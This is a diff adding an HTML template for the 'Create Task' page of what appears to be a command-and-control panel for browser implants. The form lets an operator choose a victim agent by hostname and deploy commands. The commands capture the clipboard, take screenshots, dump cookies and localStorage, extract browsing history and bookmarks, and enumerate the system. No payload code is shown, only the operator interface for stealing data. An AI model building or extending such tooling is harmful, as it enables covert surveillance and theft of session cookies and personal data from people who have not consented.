@@ -1,0 +1,179 @@
+<!-- templates/create_task.html -->
+
+{% extends "base.html" %}
+{% block title %}Create Task{% endblock %}
+
+{% block content %}
+<div class="p-6 space-y-8">
+  <!-- Header -->
+  <div class="flex justify-between items-center">
+    <div>
+      <h1 class="text-3xl font-bold text-gray-100">Create New Task</h1>
+      <p class="text-gray-400 mt-1">Configure and deploy a new task to your agents</p>
+    </div>
+    <a href="{{ url_for('tasks') }}" 
+       class="text-gray-400 hover:text-gray-300 flex items-center gap-2 px-4 py-2 rounded-lg hover:bg-gray-700/50 transition-colors">
+      <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 17l-5-5m0 0l5-5m-5 5h12" />
+      </svg>
+      <span>Back to Tasks</span>
+    </a>
+  </div>
+
+  <!-- Main Form Card -->
+  <div class="bg-gray-800 rounded-xl shadow-xl border border-gray-700/50">
+    <!-- Flash Messages -->
+    {% with messages = get_flashed_messages() %}
+      {% if messages %}
+        <div class="border-b border-red-500/20 bg-red-500/10 px-6 py-4">
+          {% for message in messages %}
+            <div class="flex items-center gap-2 text-red-400">
+              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" 
+                      d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+              </svg>
+              <span>{{ message }}</span>
+            </div>
+          {% endfor %}
+        </div>
+      {% endif %}
+    {% endwith %}
+
+    <!-- Form -->
+    <form method="POST" class="p-6 space-y-8">
+      <!-- Description Field -->
+      <div class="space-y-2">
+        <label class="text-sm font-medium text-gray-300">Task Description</label>
+        <div class="relative">
+          <input type="text" 
+                 name="description" 
+                 required
+                 placeholder="Enter a descriptive name for this task"
+                 class="w-full bg-gray-700/50 text-gray-100 placeholder-gray-500 border border-gray-600 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-purple-500 focus:border-transparent focus:outline-none transition-all">
+          <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+            <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" 
+                    d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z" />
+            </svg>
+          </div>
+        </div>
+      </div>
+
+      <!-- Command Selection -->
+      <div class="space-y-2">
+        <label class="text-sm font-medium text-gray-300">Command Type</label>
+        <div class="relative">
+          <select name="command" 
+                  required
+                  class="w-full bg-gray-700/50 text-gray-100 border border-gray-600 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-purple-500 focus:border-transparent focus:outline-none appearance-none transition-all">
+            <option value="CAPTURE_CLIPBOARD">📋 Capture Clipboard</option>
+            <option value="TAKE_SCREENSHOT">📸 Take Screenshot</option>
+            <option value="DOMSNAPSHOT">🌐 DOM Snapshot</option>
+            <option value="ENUMERATION">🔍 System Enumeration</option>
+            <option value="LOCALSTORAGEDUMP">💾 LocalStorage Dump</option>
+            <option value="GETCOOKIES">🍪 Get Cookies</option>
+            <option value="HISTORY">📅 Browsing History</option>
+            <option value="BOOKMARKS">🔖 Browser Bookmarks</option>
+          </select>
+          <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+            <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+            </svg>
+          </div>
+        </div>
+        <p id="parameterHint" class="text-sm text-gray-500 mt-1">Select a command to see parameter examples</p>
+      </div>
+
+      <!-- Agent Selection -->
+      <div class="space-y-2">
+        <label class="text-sm font-medium text-gray-300">Target Agent</label>
+        <div class="relative">
+          <select name="agent_id" 
+                  required
+                  class="w-full bg-gray-700/50 text-gray-100 border border-gray-600 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-purple-500 focus:border-transparent focus:outline-none appearance-none transition-all">
+            {% for agent in agents %}
+              <option value="{{ agent.agent_id }}">
+                🖥️ {{ agent.hostname }} ({{ agent.agent_id }})
+              </option>
+            {% endfor %}
+          </select>
+          <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+            <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+            </svg>
+          </div>
+        </div>
+      </div>
+
+      <!-- Parameters Field -->
+      <div class="space-y-2">
+        <label class="text-sm font-medium text-gray-300">Parameters (JSON)</label>
+        <div class="relative">
+          <textarea name="parameters"
+                    rows="4"
+                    placeholder='{"interval": "5"}'
+                    class="w-full bg-gray-700/50 text-gray-100 placeholder-gray-500 border border-gray-600 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-500 focus:border-transparent focus:outline-none font-mono text-sm transition-all"></textarea>
+          <div class="absolute top-3 right-3">
+            <div class="text-gray-400 bg-gray-600/50 px-2 py-1 rounded text-xs font-mono">JSON</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Submit Button -->
+      <div class="flex justify-end pt-4">
+        <button type="submit"
+                class="bg-purple-600 hover:bg-purple-700 text-white px-6 py-2.5 rounded-lg flex items-center gap-2 transition-all duration-200 hover:translate-y-[-2px] focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 focus:ring-offset-gray-800">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" 
+                  d="M13 10V3L4 14h7v7l9-11h-7z" />
+          </svg>
+          <span>Deploy Task</span>
+        </button>
+      </div>
+    </form>
+  </div>
+</div>
+
+{% endblock %}
+
+{% block scripts %}
+<script>
+  const commandSelect = document.querySelector('select[name="command"]');
+  const parameterHint = document.getElementById('parameterHint');
+  const parameterField = document.querySelector('textarea[name="parameters"]');
+
+  const parameterHints = {
+    'TAKE_SCREENSHOT': '{"quality": 80}',
+    'GETCOOKIES': '{"domain": "example.com"} or {} for all domains',
+    'ENUMERATION': '{"includeExtensions": true, "includePlugins": true}',
+    'DOMSNAPSHOT': '{}',
+    'CAPTURE_CLIPBOARD': '{}',
+    'LOCALSTORAGEDUMP': '{}',
+    'HISTORY': '{"days": 7}',
+    'BOOKMARKS': '{}'
+  };
+
+  const commandDescriptions = {
+    'TAKE_SCREENSHOT': 'Capture a screenshot of the target system',
+    'ENUMERATION': 'Collect detailed system and browser information',
+    'GETCOOKIES': 'Extract browser cookies from specified domain',
+    'DOMSNAPSHOT': 'Capture current DOM state of the webpage',
+    'CAPTURE_CLIPBOARD': 'Retrieve contents of the system clipboard',
+    'LOCALSTORAGEDUMP': 'Extract browser local storage data',
+    'HISTORY': 'Extract browser history for specified number of days',
+    'BOOKMARKS': 'Extract browser bookmarks'
+  };
+
+  commandSelect.addEventListener('change', (e) => {
+    const command = e.target.value;
+    parameterField.placeholder = parameterHints[command];
+    parameterHint.innerHTML = `
+      <span class="text-purple-400">${commandDescriptions[command]}</span><br>
+      <span class="text-gray-500">Example parameters: ${parameterHints[command]}</span>
+    `;
+  });
+
+  // Trigger initial description
+  commandSelect.dispatchEvent(new Event('change'));
+</script>
+{% endblock %}
